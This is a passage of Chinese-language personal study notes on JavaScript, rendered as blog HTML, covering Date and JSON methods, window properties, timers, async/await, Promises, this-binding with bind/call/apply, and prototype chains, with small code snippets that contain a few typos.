<li><code>getDay()</code>: 返回一个具体日期中一周的第几天; // Sunday - Saturday : 0-6</li>
<li><code>getFullYear()</code>: 返回指定日期对象的年份;</li>
<li><code>getTime()</code>: 返回从1970-1-1 00:00:00 UTC（协调世界时）到该日期经过的毫秒数，对于1970-1-1 00:00:00 UTC之前的时间返回负值;</li>
</ul>
<ol start="2">
<li><code>set 类</code>:</li>
</ol>
<ul>
<li><code>setDate()</code>: 设置日期的日;</li>
<li><code>setFullYear()</code>: 设置完整年份;</li>
</ul>
<ol start="3">
<li><code>JSON</code><ul>
<li><code>JSON.parse()</code>:<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">JSON</span>.parse(<span class="string">&#x27;&#123;&#125;&#x27;</span>); <span class="comment">// &#123;&#125;</span></span><br><span class="line"><span class="built_in">JSON</span>.parse(<span class="string">&#x27;true&#x27;</span>); <span class="comment">// true</span></span><br><span class="line"><span class="built_in">JSON</span>.parse(<span class="string">&#x27;&quot;foo&quot;&#x27;</span>);  <span class="comment">// &quot;foo&quot;</span></span><br><span class="line"><span class="built_in">JSON</span>.parse(<span class="string">&#x27;[1, 5, &quot;false&quot;]&#x27;</span>); <span class="comment">// [1, 5, &quot;false&quot;]</span></span><br><span class="line"><span class="built_in">JSON</span>.parse(<span class="string">&#x27;null&#x27;</span>);  <span class="comment">// null</span></span><br></pre></td></tr></table></figure></li>
<li><code>JSON.stringfy()</code>: <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">JSON</span>.stringify(&#123;&#125;); <span class="comment">// &#x27;&#123;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">JSON</span>.stringify(<span class="literal">true</span>); <span class="comment">// &#x27;true&#x27;</span></span><br><span class="line"><span class="built_in">JSON</span>.stringify(<span class="string">&quot;foo&quot;</span>); <span class="comment">// &#x27;&quot;foo&quot;&#x27;</span></span><br><span class="line"><span class="built_in">JSON</span>.stringify([<span class="number">1</span>, <span class="string">&quot;false&quot;</span>, <span class="literal">false</span>]); <span class="comment">// &#x27;[1,&quot;false&quot;,false]&#x27;</span></span><br><span class="line"><span class="built_in">JSON</span>.stringify(&#123; <span class="attr">x</span>: <span class="number">5</span> &#125;);  <span class="comment">// &#x27;&#123;&quot;x&quot;:5&#125;&#x27;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><code>Window</code><blockquote>
<p>顶层对象</p>
<blockquote>
</blockquote>
</blockquote>
<ol>
<li>位置大小属性:</li>
</ol>
<ul>
<li><code>window.screenX, window.screenY</code>: 只读, 返回浏览器窗口左上角相对于当前屏幕左上角的水平距离和垂直距离(单位像素)</li>
<li><code>window.innerHeight, window.innerWidth</code>: 只读, 返回当前窗口中可见部分的高度和宽度, 用户放大网页时, 由于网页的像素大小不变, 只是每个像素占据的屏幕空间变大了, 可见部分就变小了, 即这两个属性值变小了</li>
<li><code>window.outerHeight, window.outerWidth</code>: 只读, 返回浏览器窗口的高度和宽度, 包括浏览器菜单和边框(单位像素)</li>
<li><code>window.scrollX, window.scrollY</code>: 返回页面的水平广东距离和垂直距离, <code>pageXOffset</code> 和 <code>pageYOffset</code> 是两别名</li>
</ul>
<ol start="2">
<li><code>window.location</code> – 常用<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 导航到一个新页面</span></span><br><span class="line"><span class="built_in">window</span>.location.assign(<span class="string">&#x27;http://www.mozilla.org&#x27;</span>);</span><br><span class="line"><span class="comment">// or</span></span><br><span class="line"><span class="built_in">window</span>.location = <span class="string">&#x27;http://www.mozilla.org&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 强制从服务器重新加载当前页面</span></span><br><span class="line"><span class="built_in">window</span>.location.reload(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 replace() 方法重新加载页面, 并将 window.location.pathname 的值插入到 hash</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reloadPageWithHash</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> initialPage = <span class="built_in">window</span>.location.pathname;</span><br><span class="line">  <span class="built_in">window</span>.location.replace(<span class="string">&#x27;http://example.com/#&#x27;</span> + initialPage);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><code>Object</code><ul>
<li><code>obj.toString()</code>: 返回一个表示该对象的字符串</li>
</ul>
</li>
</ol>
<h4 id="⭐-异步"><a href="#⭐-异步" class="headerlink" title="⭐ 异步"></a>⭐ 异步</h4><blockquote>
<ol>
<li><code>JavaScript</code> 是单线程的, 导致了这样的问题: taskA =&gt; taskB, 即 B 任务的执行依赖于 A 任务的结果, 如果 A 任务没有完成, 单线程使得 B 任务也无法继续;<blockquote>
</blockquote>
</li>
<li>异步的方式: 将某些工作如(从服务器加载图片…)交由中间人(Promise / 回调函数)来处理, 这样主线程就不会被阻塞了;</li>
</ol>
</blockquote>
<ol>
<li><p>合作异步 <code>JavaScjript</code>: 超时和间隔</p>
<ul>
<li>setTimeout<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 在一段时间间隔后执行异步代码</span></span><br><span class="line"><span class="comment">// 也就是说 setTimeout 不是主线程在走, 主线程在运行其他代码</span></span><br><span class="line"><span class="comment">// 当 setTimeout 运行得到结果后, 回到主线程</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 无参</span></span><br><span class="line"><span class="keyword">let</span> myGreeting = <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  alert(<span class="string">&#x27;Hello, Mr. Universe!&#x27;</span>);</span><br><span class="line">&#125;, <span class="number">2000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 带参</span></span><br><span class="line"><span class="keyword">let</span> myGreeting = <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span> <span class="title">sayMessage</span>(<span class="params">message</span>) </span>&#123;</span><br><span class="line">  alert(message);</span><br><span class="line">&#125;, <span class="number">2000</span>, <span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 清除超时</span></span><br><span class="line"><span class="built_in">clearTimeout</span>(myGreeting);</span><br></pre></td></tr></table></figure></li>
<li>setInterval <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 重复执行一段代码</span></span><br><span class="line"><span class="comment">// 间隔时间包括了代码的执行时间</span></span><br><span class="line"><span class="comment">// ----40s----60s--------</span></span><br><span class="line"><span class="keyword">let</span> i = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">setInterval</span>(<span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(i);</span><br><span class="line">  i++</span><br><span class="line">&#125;, <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">clearInterval</span>(<span class="built_in">setInterval</span>)</span><br></pre></td></tr></table></figure></li>
<li>requestAnimationFrame – 在 <code>canvas</code> 提及</li>
</ul>
</li>
<li><p><code>async</code> 和 <code>await</code>: 让异步编程更简单</p>
<blockquote>
<p>使函数成为异步函数</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> hello = <span class="keyword">async</span> () =&gt; &#123;<span class="keyword">return</span> <span class="string">&#x27;hello&#x27;</span>&#125;;</span><br><span class="line">hello(); <span class="comment">// Promise &#123;&lt;fulfilled&gt;: &quot;Hello&quot;&#125;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Promise</span></span><br><span class="line">fetch(<span class="string">&#x27;coffe.jpg&#x27;</span>)</span><br><span class="line">.then(<span class="function"><span class="params">reponse</span> =&gt;</span>reponse.blob())</span><br><span class="line">.then(...)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Async / Await</span></span><br><span class="line"><span class="keyword">let</span> reponse = <span class="keyword">await</span> fetch(<span class="string">&#x27;coffe.jpg&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> myblob = <span class="keyword">await</span> response.blob();</span><br><span class="line">...</span><br></pre></td></tr></table></figure>


</li>
</ol>
<h4 id="⭐-箭头函数"><a href="#⭐-箭头函数" class="headerlink" title="⭐ 箭头函数"></a>⭐ 箭头函数</h4><h5 id="🌟-this-和箭头函数"><a href="#🌟-this-和箭头函数" class="headerlink" title="🌟 this 和箭头函数"></a>🌟 <code>this</code> 和箭头函数</h5><blockquote>
<ol>
<li>关于箭头函数中的 <code>this</code> : 引用原来的上下文, 即按词法作用域绑定它的上下文;</li>
<li>箭头函数不会创建自己的 <code>this</code>, 只会从自己的作用域链的上一层继承 <code>this</code><blockquote>
</blockquote>
</li>
</ol>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="built_in">this</span>.age = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.age++; <span class="comment">// 继承上下文环境的 this</span></span><br><span class="line">  &#125;, <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">setInterval</span>(<span class="function"><span class="keyword">function</span> <span class="title">growUp</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.age++; <span class="comment">// 将 this 定义为 全局对象</span></span><br><span class="line">    <span class="comment">// window</span></span><br><span class="line">  &#125;, <span class="number">1000</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 改进</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> that = <span class="built_in">this</span>;</span><br><span class="line">  that.age = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">setInterval</span>(<span class="function"><span class="keyword">function</span> <span class="title">growUp</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    that.age++; <span class="comment">// 将 this 定义为 全局对象</span></span><br><span class="line">    <span class="comment">// window</span></span><br><span class="line">  &#125;, <span class="number">1000</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">##### 🌟 `Promise`</span><br><span class="line"></span><br><span class="line">&gt; 对象, **代表一个 异步操作 的最终完成或失败**</span><br><span class="line">&gt;&gt;</span><br><span class="line">&gt; <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 双参函数</span></span><br><span class="line">  <span class="comment">// 成功 =&gt; resolve(somevalue);</span></span><br><span class="line">  <span class="comment">// 失败 =&gt; reject(&quot;failure reason&quot;);</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="string">``</span><span class="string">`js</span></span><br><span class="line"><span class="string">doSomething()</span></span><br><span class="line"><span class="string">.then(result =&gt; doSomethingElse(result))</span></span><br><span class="line"><span class="string">.then(newResult =&gt; doThirdThing(newResult))</span></span><br><span class="line"><span class="string">.then(finalResult =&gt; &#123;</span></span><br><span class="line"><span class="string">  console.log(`</span>Got the final result: $&#123;finalResult&#125;<span class="string">`);</span></span><br><span class="line"><span class="string">&#125;)</span></span><br><span class="line"><span class="string">.catch(failureCallback);</span></span><br></pre></td></tr></table></figure>
<p><code>then()</code> 方法最多需要两个函数参数: <code>Promise</code> 的成功和失败情况的回调函数, 只有一个也不会报错, 只不过丢失一些信息, 而 <code>catch()</code> 方法只接受一个参数, 处理拒绝的情况</p>
<blockquote>
<p>一些方法</p>
<blockquote>
</blockquote>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Promise</span>.resolve(value);</span><br><span class="line"><span class="comment">// value:</span></span><br><span class="line"><span class="comment">// 1. 值(普通值、数组等), 返回一个将值解析后的 Promise 对象;</span></span><br><span class="line"><span class="comment">// 2. Promise, 直接返回该 Promise 对象;</span></span><br><span class="line"><span class="comment">// 3. thenable, 返回的这个 thenable 对象的最终状态的 Promise;</span></span><br><span class="line"><span class="keyword">const</span> promise1 = <span class="built_in">Promise</span>.resolve(<span class="number">123</span>);</span><br><span class="line">promise1.then(<span class="function">(<span class="params">value</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(value); <span class="comment">// 123</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Promise</span>.reject(reason);</span><br><span class="line"><span class="comment">// 返回一个带有拒绝原因的 Promise 对象</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">resolved</span>(<span class="params">result</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;Resolved&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rejected</span>(<span class="params">result</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.error(result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Promise</span>.reject(<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;fail&#x27;</span>)).then(resolved, rejected);</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Promise</span>.all(iterable);</span><br><span class="line"><span class="comment">// iterable: Array, Map, Set</span></span><br><span class="line"><span class="comment">// 空: 已完成的 Promise</span></span><br><span class="line"><span class="comment">// 不包含任何 Promise: 异步完成的 Promise</span></span><br><span class="line"><span class="comment">// 其他: 返回一个处理中的 Promise, 直到所有 promise 完成 =&gt; 完成</span></span><br><span class="line"><span class="comment">// 一个失败 =&gt; 失败</span></span><br><span class="line"><span class="keyword">var</span> p1 = <span class="built_in">Promise</span>.resolve(<span class="number">3</span>);</span><br><span class="line"><span class="keyword">var</span> p2 = <span class="number">1337</span>;</span><br><span class="line"><span class="keyword">var</span> p3 = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(resolve, <span class="number">100</span>, <span class="string">&#x27;foo&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">Promise</span>.all([p1, p2, p3]).then(<span class="function"><span class="params">values</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(values); <span class="comment">// [3, 1337, &quot;foo&quot;]</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h5 id="🌟-this-——-明确执行上下文"><a href="#🌟-this-——-明确执行上下文" class="headerlink" title="🌟 this —— 明确执行上下文"></a>🌟 <code>this</code> —— 明确执行上下文</h5><ul>
<li><p><code>bind()</code>: 创建新函数, 第一个参数为该新函数的 <code>this</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">this</span>.x = <span class="number">9</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="built_in">module</span> = &#123;</span><br><span class="line">  x: <span class="number">42</span>,</span><br><span class="line">  getX: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.x;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> getXnew = <span class="built_in">module</span>.getX;</span><br><span class="line">getXnew() <span class="comment">// 9 因为函数是在全局作用域中调用的</span></span><br><span class="line"><span class="keyword">const</span> newFunction = getXnew.bind(<span class="built_in">module</span>);</span><br><span class="line"><span class="comment">// 在该函数中 this 就是 module</span></span><br><span class="line">newFunction(); <span class="comment">// 42</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>call(): function.call(thisArg, arg1, arg2, ...)</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">a, b</span>) </span>&#123; </span><br><span class="line">    <span class="keyword">return</span> a + b; </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sum</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Array</span>.prototype.reduce.call(<span class="built_in">arguments</span>, add); <span class="comment">// add 是 reduce 要执行的函数</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(sum(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>)); <span class="comment">// 10</span></span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 在构造函数中使用</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">this</span>.name = <span class="string">&#x27;ly&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Student</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">  Person.call(<span class="built_in">this</span>, name);</span><br><span class="line">  <span class="built_in">this</span>.vocation = <span class="string">&#x27;student&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p><code>apply(): function.apply(thisarg, arguments)</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// call() 接受参数列表, apply() 接受参数数组</span></span><br><span class="line"><span class="keyword">const</span> numbers = [<span class="number">5</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">7</span>];</span><br><span class="line"><span class="keyword">const</span> max = <span class="built_in">Math</span>.max.apply(<span class="literal">null</span>, numbers); <span class="comment">// 7</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<h4 id="⭐-js-中的对象-补充"><a href="#⭐-js-中的对象-补充" class="headerlink" title="⭐ js 中的对象 - 补充"></a>⭐ <code>js</code> 中的对象 - 补充</h4><ol>
<li><p>原型链相关方法 — <code>Object.create</code> 和 <code>Object.getPrototypeOf()</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> Animal = &#123;</span><br><span class="line">  name: <span class="string">&#x27;bird&#x27;</span>, <span class="comment">// 默认值</span></span><br><span class="line">  show: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">this</span>.name);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 以 Animal 为原型 创建一个新对象</span></span><br><span class="line"><span class="keyword">var</span> newAnimal = <span class="built_in">Object</span>.create(Animal);</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.getPrototypeOf(newAnimal) === Animal; <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.getPrototypeOf(Animal) === <span class="built_in">Object</span>.prototype; <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> prototype1 = &#123;&#125;;</span><br><span class="line"><span class="keyword">const</span> object1 = <span class="built_in">Object</span>.create(prototype1);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.getPrototypeOf(object1) === prototype1); <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.getPrototypeOf(<span class="built_in">Object</span>) === <span class="built_in">Function</span>.prototype; <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.getPrototypeOf(prototype1) === <span class="built_in">Object</span>.prototype; <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 注意: Javascript 的 Object 是构造函数</span></span><br><span class="line"></span><br><span class="line">总结:</span><br><span class="line"><span class="number">1.</span> <span class="built_in">Function</span> =&gt; <span class="function"><span class="params">Object</span> =&gt;</span> <span class="keyword">var</span> a = &#123;&#125; =&gt; <span class="keyword">var</span> b = <span class="built_in">Object</span>.create(a)</span><br><span class="line"><span class="number">2.</span> b 以 a 的原型创建了对象, 也就是说 b.__proto__ == a, a 本身没有构造函数, 但是它继承了它的原型, 也就是 a.__proto__ 的构造函数, 也就是说 a.constructor == a.__proto__.constructor == <span class="built_in">Object</span>, b 的原型是 a, 故而 b.constructor == a.constructor;</span><br><span class="line"><span class="number">3.</span> a.__proto__ == <span class="built_in">Object</span>.prototype</span><br><span class="line"><span class="number">4.</span> <span class="built_in">Object</span> 单独一个是函数了, <span class="built_in">Object</span>() 是对象啦, 但是函数也是对象, 于是 <span class="built_in">Object</span>.__proto__ == <span class="built_in">Function</span>.prototype</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span> <span class="built_in">Function</span> =&gt; <span class="function"><span class="params">Object</span> =&gt;</span> <span class="keyword">var</span> a = <span class="keyword">new</span> f() =&gt; f = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;<span class="built_in">this</span>.a = <span class="number">1</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="number">6.</span> a.__proto__ == f.prototype</span><br><span class="line"><span class="number">7.</span> 可以说函数即对象, 于是 f.__proto__ == <span class="built_in">Function</span>.prototype</span><br><span class="line"><span class="number">8.</span> f.prototype.__proto__ === <span class="built_in">Object</span>.prototype</span><br><span class="line"></span><br><span class="line"><span class="number">9.</span> 还有一点需要注意啦, 函数的原型会创建一个 <span class="title">constructor</span> 属性, 并指向拥有整个原型对象的函数或对象</span><br><span class="line">10. <span class="title">var</span> <span class="title">Book</span> = <span class="title">function</span>(<span class="params"></span>) &#123;&#125;  =&gt;  <span class="keyword">var</span> book = <span class="keyword">new</span> Book() 以这个为例, Book.prototype === book.__proto__</span><br><span class="line"><span class="number">11.</span> Book.prototype.constructor === Book (惊不惊喜)</span><br></pre></td></tr></table></figure>
</li>
<li><p>定义 <code>getters</code> 与 <code>setters</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> o = &#123;</span><br><span class="line">  a: <span class="number">7</span>,</span><br><span class="line"></span><br><span class="line">  <span class="keyword">get</span> <span class="title">b</span>() &#123; <span class="comment">// 必须无参数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.a + <span class="number">1</span>;</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="keyword">set</span> <span class="title">c</span>(<span class="params">x</span>) &#123; <span class="comment">// 只接受一个参数</span></span><br><span class="line">    <span class="built_in">this</span>.a = x / <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  o.a <span class="comment">// 7</span></span><br><span class="line">  o.b <span class="comment">// 8, 返回 o.a + 1 的 getter</span></span><br><span class="line">  o.c = <span class="number">50</span> <span class="comment">// 由 o.c 的值设置 o.a 值的 setter</span></span><br><span class="line">  o.a <span class="comment">// 25</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>Object.defineProperty</code>: 定义一个已经声明的函数作为 <code>getter</code> 和 <code>setter</code> 方法</p>
<blockquote>
</blockquote>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 为 Date 原型 扩展一个 year 属性</span></span><br><span class="line"><span class="keyword">var</span> d = <span class="built_in">Date</span>.prototype;</span><br><span class="line"><span class="built_in">Object</span>.defineProperty(d, <span class="string">&quot;year&quot;</span>, &#123;</span><br><span class="line">  configurable: <span class="literal">false</span>, <span class="comment">// true =&gt; 属性描述符可改变, 属性可删除</span></span><br><span class="line">  enumerable: <span class="literal">true</span>, <span class="comment">// true =&gt; 可枚举</span></span><br><span class="line">  value: <span class="literal">undefined</span>, <span class="comment">// 属性值 默认为 undefined</span></span><br><span class="line">  writable: <span class="literal">false</span>, <span class="comment">// true =&gt; 属性值可改变</span></span><br><span class="line">  get: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="keyword">return</span> <span class="built_in">this</span>.getFullYear() &#125;,</span><br><span class="line">  set: <span class="function"><span class="keyword">function</span>(<span class="params">y</span>) </span>&#123; <span class="built_in">this</span>.setFullYear(y); &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 不能这么搞</span></span><br><span class="line"><span class="keyword">var</span> d = &#123;&#125;;</span><br><span class="line"><span class="built_in">Object</span>.defineProperty(d, <span class="string">&quot;year&quot;</span>, &#123;</span><br><span class="line">  get: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;<span class="keyword">return</span> <span class="number">2021</span>&#125;,</span><br><span class="line">  set: <span class="function"><span class="keyword">function</span>(<span class="params">val</span>) </span>&#123;<span class="built_in">this</span>.year = val&#125; <span class="comment">// 这里会无限循环, 只能为其他属性赋值</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">&gt; <span class="string">`Object.defineProperties`</span>: 对已创建的对象 **在任何时候** 添加 <span class="string">`getter`</span> 或 <span class="string">`setter`</span> 方法</span><br><span class="line">&gt;&gt;</span><br><span class="line"></span><br><span class="line"><span class="string">``</span><span class="string">`js</span></span><br><span class="line"><span class="string">var o = &#123; a: 0 &#125;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 第一个参数: 想定义 getter 或 setter 的对象</span></span><br><span class="line"><span class="string">// 第二个参数: 对象</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Object.defineProperties(o, &#123;</span></span><br><span class="line"><span class="string">  &quot;b&quot;: &#123; get: function() &#123; return this.a + 1 &#125;&#125;,</span></span><br><span class="line"><span class="string">  &quot;c&quot;: &#123; set: function(x) &#123; this.a = x/2 &#125;&#125;</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">o.c = 10;</span></span><br><span class="line"><span class="string">o.b // 6</span></span><br></pre></td></tr></table></figure></li>
<li><p>对象的比较</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 两个独立声明的对象永远不相等</span></span><br><span class="line"><span class="keyword">var</span> f1 = &#123;<span class="attr">a</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> f2 = &#123;<span class="attr">a</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> f3 = f1</span><br><span class="line"><span class="comment">// 将 f1 的对象引用赋值给 f3, 即将 f3 指向 f1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// === 检查数值是否相等</span></span><br><span class="line"><span class="comment">// 1 === &#x27;1&#x27;    false</span></span><br><span class="line"><span class="comment">// 1 == &#x27;1&#x27;     true</span></span><br><span class="line"></span><br><span class="line">f1 == f2 <span class="comment">// false</span></span><br><span class="line">f1 === f2 <span class="comment">// false</span></span><br><span class="line">f1 == f3 <span class="comment">// true</span></span><br><span class="line">f1 === f3 <span class="comment">// true</span></span><br></pre></td></tr></table></figure></li>
<li><p><code>Object.keys()</code>: 返回一个对象所有属性的数组</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"> object = &#123;</span><br><span class="line">  say: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">  year: <span class="number">34</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.keys(object) <span class="comment">// [&#x27;say&#x27;, &#x27;year&#x27;]</span></span><br><span class="line"><span class="comment">// Object.getOwnPropertyNames(obj) 与 keys 的效果一样, 区别是 keys 只返回可枚举的属性, 而它还返回不可枚举的属性</span></span><br><span class="line"><span class="built_in">Object</span>.keys([<span class="number">1</span>, <span class="number">2</span>]) <span class="comment">// [&quot;0&quot;, &quot;1&quot;]</span></span><br><span class="line"><span class="built_in">Object</span>.getOwnPropertyNames([<span class="number">1</span>, <span class="number">2</span>]) <span class="comment">// [&quot;0&quot;, &quot;1&quot;, &quot;length&quot;]</span></span><br></pre></td></tr></table></figure></li>
<li></li>
<li><p>一些常见的用法(但还不知道)</p>
</li>
</ol>
<ul>
<li><p><code>with</code> — 懂?</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;<span class="attr">p1</span>: <span class="number">1</span>, <span class="attr">p2</span>: <span class="number">2</span>&#125;;</span><br><span class="line"><span class="function"><span class="title">with</span>(<span class="params">obj</span>)</span> &#123;</span><br><span class="line">  p1 = <span class="number">4</span>;</span><br><span class="line">  p2 = <span class="number">5</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p><code>funciton*</code> — 定义一个生成器函数</p>
